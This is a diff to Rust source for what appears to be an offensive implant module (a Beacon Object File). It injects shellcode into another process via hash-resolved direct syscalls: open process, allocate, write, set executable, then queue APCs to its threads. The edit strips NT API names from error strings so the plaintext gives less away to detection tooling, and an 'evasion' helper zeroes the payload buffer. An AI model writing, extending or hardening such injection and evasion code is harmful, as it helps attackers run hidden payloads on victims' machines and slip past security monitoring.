@@ -110,7 +110,7 @@ fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
     static OP_OPEN: SyscallEntry = SyscallEntry::new();
     const OPEN_HASH: u32 = common::hash::djb2(b"NtOpenProcess");
     let (op_ssn, op_addr) = unsafe { resolve(&OP_OPEN, OPEN_HASH) }
-        .map_err(|_| "resolve NtOpenProcess")?;
+        .map_err(|_| "resolve")?;
     let oa = ObjectAttributes {
         length: core::mem::size_of::<ObjectAttributes>() as u32,
         root_directory: 0, object_name: 0, attributes: 0,
@@ -129,14 +129,14 @@ fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
     };
     if s != STATUS_SUCCESS || h_proc == 0 {
         common::evasion::secure_zero(&mut sc);
-        return Err("NtOpenProcess failed");
+        return Err("proc open failed");
     }
 
     // ---- 2. NtAllocateVirtualMemory (6-arg) ----
     static OP_ALLOC: SyscallEntry = SyscallEntry::new();
     const ALLOC_HASH: u32 = common::hash::djb2(b"NtAllocateVirtualMemory");
     let (a_ssn, a_addr) = unsafe { resolve(&OP_ALLOC, ALLOC_HASH) }
-        .map_err(|_| "resolve NtAllocateVirtualMemory")?;
+        .map_err(|_| "resolve")?;
     let mut base: usize = 0;
     let mut sz: usize = sc.len();
     const MEM_COMMIT: u32 = 0x1000;
@@ -155,14 +155,14 @@ fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
     if s2 != STATUS_SUCCESS {
         close_handle(h_proc);
         common::evasion::secure_zero(&mut sc);
-        return Err("NtAllocateVirtualMemory failed");
+        return Err("alloc failed");
     }
 
     // ---- 3. NtWriteVirtualMemory (5-arg) ----
     static OP_WRITE: SyscallEntry = SyscallEntry::new();
     const WRITE_HASH: u32 = common::hash::djb2(b"NtWriteVirtualMemory");
     let (w_ssn, w_addr) = unsafe { resolve(&OP_WRITE, WRITE_HASH) }
-        .map_err(|_| "resolve NtWriteVirtualMemory")?;
+        .map_err(|_| "resolve")?;
     let mut written: usize = 0;
     let s3 = unsafe {
         do_syscall5(
@@ -175,14 +175,14 @@ fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
     common::evasion::secure_zero(&mut sc);
     if s3 != STATUS_SUCCESS {
         close_handle(h_proc);
-        return Err("NtWriteVirtualMemory failed");
+        return Err("write failed");
     }
 
     // ---- 4. NtProtectVirtualMemory → RX (5-arg) ----
     static OP_PROT: SyscallEntry = SyscallEntry::new();
     const PROT_HASH: u32 = common::hash::djb2(b"NtProtectVirtualMemory");
     let (p_ssn, p_addr) = unsafe { resolve(&OP_PROT, PROT_HASH) }
-        .map_err(|_| "resolve NtProtectVirtualMemory")?;
+        .map_err(|_| "resolve")?;
     let mut base2 = base;
     let mut sz2 = written;
     let mut old_prot: u32 = 0;
@@ -198,7 +198,7 @@ fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
     };
     if s4 != STATUS_SUCCESS {
         close_handle(h_proc);
-        return Err("NtProtectVirtualMemory(RX) failed");
+        return Err("protect failed");
     }
 
     // ---- 5. Enumerate threads of the target via NtQuerySystemInformation
@@ -212,12 +212,12 @@ fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
     static OP_APC: SyscallEntry = SyscallEntry::new();
     const APC_HASH: u32 = common::hash::djb2(b"NtQueueApcThread");
     let (apc_ssn, apc_addr) = unsafe { resolve(&OP_APC, APC_HASH) }
-        .map_err(|_| "resolve NtQueueApcThread")?;
+        .map_err(|_| "resolve")?;
 
     static OP_OT: SyscallEntry = SyscallEntry::new();
     const OT_HASH: u32 = common::hash::djb2(b"NtOpenThread");
     let (ot_ssn, ot_addr) = unsafe { resolve(&OP_OT, OT_HASH) }
-        .map_err(|_| "resolve NtOpenThread")?;
+        .map_err(|_| "resolve")?;
 
     let mut queued = 0u32;
     for tid in tids {
@@ -260,7 +260,7 @@ fn enum_threads(pid: u32) -> Result<Vec<usize>, &'static str> {
     static OP_QSI: SyscallEntry = SyscallEntry::new();
     const QSI_HASH: u32 = common::hash::djb2(b"NtQuerySystemInformation");
     let (q_ssn, q_addr) = unsafe { resolve(&OP_QSI, QSI_HASH) }
-        .map_err(|_| "resolve NtQuerySystemInformation")?;
+        .map_err(|_| "resolve")?;
 
     let mut size: u32 = 65536;
     let buf;
@@ -278,11 +278,11 @@ fn enum_threads(pid: u32) -> Result<Vec<usize>, &'static str> {
         };
         if st == STATUS_SUCCESS { buf = v; break; }
         if st == STATUS_INFO_LENGTH_MISMATCH {
-            if size >= 64 * 1024 * 1024 { return Err("QSI buffer too large"); }
+            if size >= 64 * 1024 * 1024 { return Err("buf too large"); }
             size = size.saturating_mul(2);
             continue;
         }
-        return Err("NtQuerySystemInformation failed");
+        return Err("sysq failed");
     }
 
     // Walk entries: NextEntryOffset @ +0, NumberOfThreads @ +4,
